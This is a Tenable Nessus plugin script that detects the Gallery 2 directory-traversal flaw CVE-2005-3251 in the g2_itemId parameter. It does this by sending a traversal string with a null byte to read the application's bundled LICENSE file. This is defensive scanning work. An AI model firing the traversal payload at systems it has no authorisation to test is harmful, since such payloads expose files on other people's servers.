#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20015);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2013/04/02 13:59:06 $");

  script_cve_id("CVE-2005-3251");
  script_bugtraq_id(15108);
  script_osvdb_id(20017);

  script_name(english:"Gallery main.php g2_itemId Parameter Traversal Arbitrary File Access");
  script_summary(english:"Checks for g2_itemId parameter Directory Traversal vulnerability in Gallery");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is affected by a
directory traversal flaw."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Gallery hosted on the remote web server fails to
sanitize user-supplied input to the 'g2_itemId' parameter of the
'main.php' script before using it to read cached files.  If PHP's
'display_errors' setting is enabled, an attacker can exploit this flaw
to read arbitrary files on the remote host, subject to the privileges of
the web server user id."
  );
  script_set_attribute(attribute:"see_also", value:"http://dipper.info/security/20051012");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/413405");
  script_set_attribute(attribute:"see_also", value:"http://galleryproject.org/gallery_2.0.1_released");
  script_set_attribute(attribute:"solution", value:"Upgrade to Gallery 2.0.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/10/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/10/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gallery_project:gallery");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2013 Tenable Network Security, Inc.");

  script_dependencies("gallery_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/gallery", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "gallery",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];

# Try to exploit the flaw to read the LICENSE file included in the distribution.
res = http_send_recv3(
  method : "GET",
  item   : dir + "/main.php?g2_itemId=../../../../../LICENSE%00",
  port   : port,
  exit_on_fail : TRUE
);

# There's a problem if we get an error involving requireonce
if (
  "</b>:  requireonce(" >< res[2] &&
  "/modules/core/classes/../../../               GNU GENERAL PUBLIC LICENSE" >< res[2]
)
{
  if (report_verbosity > 0)
  {
    report = "\n" + res[2];
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Gallery", build_url(qs:dir, port:port));
